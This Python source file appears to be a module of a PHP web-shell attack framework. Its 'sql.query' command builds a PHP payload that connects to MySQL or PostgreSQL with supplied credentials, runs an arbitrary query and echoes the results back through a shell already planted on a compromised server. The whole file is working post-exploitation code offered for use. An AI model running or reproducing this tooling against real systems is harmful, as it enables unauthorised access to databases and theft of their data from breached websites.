'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
import random
from core.parameters import ParametersList, Parameter as P

classname = 'Query'
 

    
class Query(Module):
    '''Execute SQL query
    :sql.query mysql|postgres <host> <user> <pass> "<query>"
    '''
    
    vectors = VectorList([
            Vector('shell.php', 'php_fetch', """
$c="%s"; $q="%s"; $f="%s";
if(@$c("%s","%s","%s")){
$result = $q("%s");
while (list($table) = $f($result)) {
echo $table."\n";
}
}""")
            ])

    params = ParametersList('Execute SQL query', vectors,
            P(arg='dbms', help='Database', choices=['mysql', 'postgres'], required=True, pos=0),
            P(arg='user', help='SQL user', required=True, pos=1),
            P(arg='pwd', help='SQL password', required=True, pos=2),
            P(arg='query', help='SQL query', required=True, pos=3),
            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=4)
            )


    def run_module( self, mode, user, pwd, query, host):

        
        if mode == 'mysql':
            sql_connect = "mysql_connect"
            sql_query = "mysql_query"
            sql_fetch = "mysql_fetch_row"
        elif mode == 'postgres':
            sql_connect = "pg_connect"
            sql_query = "pg_query"
            sql_fetch = "pg_fetch_row"
        else:
            raise ModuleException(self.name,  "Database '%s' unsupported" % (mode))

        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        for vector in vectors:
            response = self.__execute_payload(vector, [sql_connect, sql_query, sql_fetch, host, user, pwd, query])
            if response != None:
                self.params.set_and_check_parameters({'vector' : vector.name})
                return response
                
        
    def __execute_payload(self, vector, parameters):
        
        payload = self.__prepare_payload(vector, parameters) 
        
        response = self.modhandler.load(vector.interpreter).run({ 0: payload })
        if response:
            return response
        return None


    def __prepare_payload( self, vector, parameters ):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        



    
    
    